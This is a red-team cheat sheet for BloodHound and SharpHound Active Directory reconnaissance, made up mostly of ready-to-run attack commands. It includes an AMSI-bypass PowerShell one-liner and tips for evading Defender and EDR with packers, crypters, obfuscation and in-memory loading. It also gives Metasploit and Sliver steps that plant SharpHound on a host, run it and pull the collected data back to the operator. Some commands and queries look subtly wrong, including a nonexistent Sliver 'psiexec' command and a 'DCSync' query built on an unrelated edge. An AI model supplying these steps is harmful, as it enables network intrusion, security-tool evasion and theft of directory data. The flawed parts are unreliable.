
### **BloodHound & SharpHound Cheat Sheet**

BloodHound and SharpHound are powerful tools used to analyze Active Directory (AD) environments and discover attack paths. Here's a cheat sheet on using these tools effectively, including evasion techniques and integration with Metasploit and Sliver.

---

### **1. BloodHound Overview**

- **BloodHound**: A tool that visualizes AD attack paths. It uses graph theory to reveal the shortest path an attacker might take to reach high-privilege accounts.

- **SharpHound**: The data collection tool used by BloodHound. It collects information about the AD environment and outputs data that BloodHound can analyze.

---

### **2. Basic BloodHound & SharpHound Workflow**

1. **Deploy SharpHound** to collect data from the AD environment.
   ```bash
   SharpHound.exe -c All
   ```

2. **Ingest the data** collected by SharpHound into BloodHound.
   - Use the BloodHound GUI to upload the JSON files created by SharpHound.

3. **Analyze the data** using the BloodHound interface.
   - Identify attack paths, high-value targets, and potential lateral movement strategies.

---

### **3. Common SharpHound Collection Methods**

- **All Data Collection**:
  ```bash
  SharpHound.exe -c All
  ```

- **Session Collection**:
  ```bash
  SharpHound.exe -c Session
  ```

- **Group Membership Collection**:
  ```bash
  SharpHound.exe -c Group
  ```

- **ACL Collection**:
  ```bash
  SharpHound.exe -c ACL
  ```

- **Custom Collection**:
  ```bash
  SharpHound.exe -c "ObjectProps,Group,Trusts,ACL,Container,SPNTargets,GPOLocalGroup,Session,LoggedOn"
  ```

- **Domain Admins Path Collection**:
  ```bash
  SharpHound.exe -c DCOM,PSRemote,ACL,Trusts,SPNTargets -d DOMAIN -p BloodHound
  ```

---

### **4. Evasion Techniques**

#### **Bypass AMSI:**
- **AMSI** (Antimalware Scan Interface) can detect and block SharpHound. To bypass it:
  - Use obfuscated or custom binaries of SharpHound.
  - Use AMSI bypass techniques before executing SharpHound.

- **Example of AMSI Bypass in PowerShell**:
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```

#### **Evade Defender/EDR:**
- Use SharpHound with **obfuscated signatures**.
- **Rename SharpHound** executables to avoid signature-based detection.
- Use **reflective loaders** to execute SharpHound in-memory without writing to disk.
- Utilize **packing tools** or **custom crypters** to avoid detection.

#### **In-Memory Execution:**
- Use **Cobalt Strike**, **Metasploit**, or **Sliver** to inject SharpHound directly into memory.

---

### **5. Using SharpHound with Metasploit & Sliver**

#### **Metasploit Integration:**
- **Upload SharpHound via Metasploit**:
  ```bash
  upload /path/to/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe
  ```
- **Execute SharpHound**:
  ```bash
  execute -f C:\\Windows\\Temp\\SharpHound.exe -c All
  ```
- **Download the results**:
  ```bash
  download C:\\Windows\\Temp\\*.zip /local/path
  ```

#### **Sliver Integration:**
- **SharpHound in Sliver**:
  - Generate a payload that can execute SharpHound in memory using Sliver's `execute-assembly` command.

  ```bash
  sliver > execute-assembly /path/to/SharpHound.exe -c All
  ```

- **Sliver AMSI Bypass**:
  - Use AMSI bypass techniques before executing SharpHound in Sliver.

  ```bash
  sliver > psiexec -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
  ```

---

### **6. Advanced Techniques**

- **SharpHound with Cobalt Strike**:
  - Use **execute-assembly** to run SharpHound directly in memory.
  ```bash
  execute-assembly /path/to/SharpHound.exe -c All
  ```

- **Custom C2 Profiles**:
  - Modify C2 profiles to reduce the likelihood of detection when executing BloodHound-related tasks.

- **Obfuscation**:
  - Obfuscate the SharpHound binary using tools like `ConfuserEx` or custom obfuscators to evade detection.

---

### **7. Detection and Mitigation**

- **Detection**:
  - Monitor for large numbers of LDAP queries, which are common during SharpHound data collection.
  - Watch for unusual Kerberos ticket requests or DCOM execution.

- **Mitigation**:
  - Limit unnecessary delegation and administrative privileges.
  - Implement stringent network segmentation and monitoring.
  - Regularly audit AD permissions and clean up stale accounts.

---

### **8. BloodHound Queries (Cypher) Examples**

- **Find Domain Admins**:
  ```cypher
  MATCH (n:User)-[:MemberOf*1..]->(g:Group) WHERE g.name = "DOMAIN ADMINS@DOMAIN.LOCAL" RETURN n.name
  ```

- **Find Paths to Domain Admin**:
  ```cypher
  MATCH p=shortestPath((n:User {name:"lowprivuser@DOMAIN.LOCAL"})-[r*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
  ```

- **Find Users with SPN (Service Principal Name)**:
  ```cypher
  MATCH (u:User) WHERE u.hasspn = true RETURN u.name
  ```

- **Identify Users with DCSync Rights**:
  ```cypher
  MATCH (c:User {name:"DOMAIN\\Administrator"})-[r:AllowedToAct]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name, r
  ```

---

This cheat sheet provides essential commands and strategies for using BloodHound and SharpHound effectively, including tips for evading AMSI, Defender, and EDR solutions, and how to integrate these tools with Metasploit and Sliver.